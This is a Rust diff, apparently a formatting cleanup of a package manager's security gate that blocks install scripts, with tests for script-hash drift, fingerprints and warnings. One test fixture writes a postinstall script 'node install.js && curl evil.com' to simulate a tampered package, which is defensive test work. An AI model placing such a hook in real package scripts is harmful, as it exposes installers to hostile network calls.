@@ -245,12 +245,8 @@ pub fn compute_blocked_packages(
 
         // Strict gate query. Phase 4 binds approvals to
         // (name, version, integrity, script_hash).
-        let trust = policy.can_run_scripts_strict(
-            name,
-            version,
-            integrity.as_deref(),
-            Some(&script_hash),
-        );
+        let trust =
+            policy.can_run_scripts_strict(name, version, integrity.as_deref(), Some(&script_hash));
 
         let (is_blocked, binding_drift) = match trust {
             // Strict approval covers this exact tuple — NOT blocked.
@@ -403,7 +399,12 @@ mod tests {
     use std::fs;
     use tempfile::tempdir;
 
-    fn make_blocked(name: &str, version: &str, integrity: Option<&str>, script_hash: Option<&str>) -> BlockedPackage {
+    fn make_blocked(
+        name: &str,
+        version: &str,
+        integrity: Option<&str>,
+        script_hash: Option<&str>,
+    ) -> BlockedPackage {
         BlockedPackage {
             name: name.to_string(),
             version: version.to_string(),
@@ -525,26 +526,21 @@ mod tests {
         for entry in entries {
             let name = entry.unwrap().file_name();
             let name_str = name.to_string_lossy();
-            assert!(
-                !name_str.ends_with(".tmp"),
-                "temp file leaked: {name_str}"
-            );
+            assert!(!name_str.ends_with(".tmp"), "temp file leaked: {name_str}");
         }
     }
 
     #[test]
     fn write_then_read_round_trip_preserves_all_fields() {
         let dir = tempdir().unwrap();
-        let original = make_state(vec![
-            BlockedPackage {
-                name: "esbuild".into(),
-                version: "0.25.1".into(),
-                integrity: Some("sha512-foo".into()),
-                script_hash: Some("sha256-bar".into()),
-                phases_present: vec!["preinstall".into(), "postinstall".into()],
-                binding_drift: true,
-            },
-        ]);
+        let original = make_state(vec![BlockedPackage {
+            name: "esbuild".into(),
+            version: "0.25.1".into(),
+            integrity: Some("sha512-foo".into()),
+            script_hash: Some("sha256-bar".into()),
+            phases_present: vec!["preinstall".into(), "postinstall".into()],
+            binding_drift: true,
+        }]);
         write_build_state(dir.path(), &original).unwrap();
         let recovered = read_build_state(dir.path()).unwrap();
         assert_eq!(recovered.blocked_packages, original.blocked_packages);
@@ -601,8 +597,18 @@ mod tests {
 
     #[test]
     fn compute_blocked_set_fingerprint_changes_on_integrity_change() {
-        let a = vec![make_blocked("esbuild", "0.25.1", Some("sha512-old"), Some("sha256-x"))];
-        let b = vec![make_blocked("esbuild", "0.25.1", Some("sha512-new"), Some("sha256-x"))];
+        let a = vec![make_blocked(
+            "esbuild",
+            "0.25.1",
+            Some("sha512-old"),
+            Some("sha256-x"),
+        )];
+        let b = vec![make_blocked(
+            "esbuild",
+            "0.25.1",
+            Some("sha512-new"),
+            Some("sha256-x"),
+        )];
         assert_ne!(
             compute_blocked_set_fingerprint(&a),
             compute_blocked_set_fingerprint(&b),
@@ -632,9 +638,8 @@ mod tests {
 
     #[test]
     fn compute_blocked_set_fingerprint_format_starts_with_sha256_prefix() {
-        let f = compute_blocked_set_fingerprint(&[make_blocked(
-            "x", "1.0.0", None, Some("sha256-y"),
-        )]);
+        let f =
+            compute_blocked_set_fingerprint(&[make_blocked("x", "1.0.0", None, Some("sha256-y"))]);
         assert!(f.starts_with("sha256-"));
         assert_eq!(f.len(), 71);
     }
@@ -677,7 +682,12 @@ mod tests {
         SecurityPolicy::default_policy()
     }
 
-    fn rich_policy(name: &str, version: &str, integrity: Option<&str>, script_hash: Option<&str>) -> SecurityPolicy {
+    fn rich_policy(
+        name: &str,
+        version: &str,
+        integrity: Option<&str>,
+        script_hash: Option<&str>,
+    ) -> SecurityPolicy {
         let mut map = HashMap::new();
         map.insert(
             format!("{name}@{version}"),
@@ -704,14 +714,14 @@ mod tests {
         );
         let store = fake_store_at(store_root.path());
 
-        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), Some("sha512-x".to_string()))];
-        let capture = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
+        let installed = vec![(
+            "esbuild".to_string(),
+            "0.25.1".to_string(),
+            Some("sha512-x".to_string()),
+        )];
+        let capture =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
 
         assert!(capture.should_emit_warning);
         assert!(!capture.all_clear_banner);
@@ -727,13 +737,9 @@ mod tests {
         let store = fake_store_at(store_root.path());
 
         // Empty installed list — nothing to block
-        let capture = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &[],
-            &empty_policy(),
-        )
-        .unwrap();
+        let capture =
+            capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
+                .unwrap();
         assert!(!capture.should_emit_warning);
         assert!(capture.state.blocked_packages.is_empty());
     }
@@ -750,26 +756,22 @@ mod tests {
         );
         let store = fake_store_at(store_root.path());
 
-        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), Some("sha512-x".to_string()))];
+        let installed = vec![(
+            "esbuild".to_string(),
+            "0.25.1".to_string(),
+            Some("sha512-x".to_string()),
+        )];
 
         // First install: emits
-        let cap1 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
+        let cap1 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
         assert!(cap1.should_emit_warning);
 
         // Second install with the SAME blocked set: silent
-        let cap2 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
+        let cap2 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
         assert!(
             !cap2.should_emit_warning,
             "second install with unchanged blocked set must NOT re-warn"
@@ -843,13 +845,9 @@ mod tests {
         );
         let store = fake_store_at(store_root.path());
         let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];
-        let cap1 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
+        let cap1 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
         assert!(cap1.should_emit_warning);
 
         // Mutate the package.json in the store to drift the script hash
@@ -860,17 +858,10 @@ mod tests {
             &serde_json::json!({"postinstall": "node install.js && curl evil.com"}),
         );
 
-        let cap2 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
-        assert!(
-            cap2.should_emit_warning,
-            "script hash drift must re-emit"
-        );
+        let cap2 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
+        assert!(cap2.should_emit_warning, "script hash drift must re-emit");
         assert_ne!(
             cap1.state.blocked_set_fingerprint,
             cap2.state.blocked_set_fingerprint
@@ -890,20 +881,17 @@ mod tests {
         let store = fake_store_at(store_root.path());
 
         // First install with empty policy → blocked
-        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), Some("sha512-x".to_string()))];
-        let cap1 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &empty_policy(),
-        )
-        .unwrap();
+        let installed = vec![(
+            "esbuild".to_string(),
+            "0.25.1".to_string(),
+            Some("sha512-x".to_string()),
+        )];
+        let cap1 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
         assert!(cap1.should_emit_warning);
         assert!(!cap1.all_clear_banner);
-        let captured_script_hash = cap1.state.blocked_packages[0]
-            .script_hash
-            .clone()
-            .unwrap();
+        let captured_script_hash = cap1.state.blocked_packages[0].script_hash.clone().unwrap();
 
         // Second install with a policy that approves esbuild (we use the
         // captured script_hash from cap1 so the binding matches)
@@ -913,13 +901,8 @@ mod tests {
             Some("sha512-x"),
             Some(&captured_script_hash),
         );
-        let cap2 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &policy,
-        )
-        .unwrap();
+        let cap2 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
         assert!(cap2.should_emit_warning);
         assert!(
             cap2.all_clear_banner,
@@ -928,13 +911,8 @@ mod tests {
         assert!(cap2.state.blocked_packages.is_empty());
 
         // Third install with the same policy → silent (no positive banner spam)
-        let cap3 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &policy,
-        )
-        .unwrap();
+        let cap3 =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
         assert!(
             !cap3.should_emit_warning,
             "after the all-clear banner, repeated installs are silent"
@@ -954,20 +932,14 @@ mod tests {
         let store = fake_store_at(store_root.path());
 
         // Policy approves esbuild but with a STALE script hash → drift
-        let policy = rich_policy(
-            "esbuild",
-            "0.25.1",
-            Some("sha512-x"),
-            Some("sha256-stale"),
-        );
-        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), Some("sha512-x".to_string()))];
-        let capture = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &installed,
-            &policy,
-        )
-        .unwrap();
+        let policy = rich_policy("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-stale"));
+        let installed = vec![(
+            "esbuild".to_string(),
+            "0.25.1".to_string(),
+            Some("sha512-x".to_string()),
+        )];
+        let capture =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
 
         assert!(capture.should_emit_warning);
         assert_eq!(capture.state.blocked_packages.len(), 1);
@@ -1041,13 +1013,8 @@ mod tests {
         let store = fake_store_at(store_root.path());
 
         // First call: silent (no installed packages), but state file written
-        let cap1 = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &[],
-            &empty_policy(),
-        )
-        .unwrap();
+        let cap1 = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
+            .unwrap();
         assert!(!cap1.should_emit_warning);
         assert!(read_build_state(project.path()).is_some());
 
@@ -1056,13 +1023,8 @@ mod tests {
 
         std::thread::sleep(std::time::Duration::from_millis(1100));
 
-        let _ = capture_blocked_set_after_install(
-            project.path(),
-            &store,
-            &[],
-            &empty_policy(),
-        )
-        .unwrap();
+        let _ = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
+            .unwrap();
         let captured_at_2 = read_build_state(project.path()).unwrap().captured_at;
         assert_ne!(
             captured_at_1, captured_at_2,
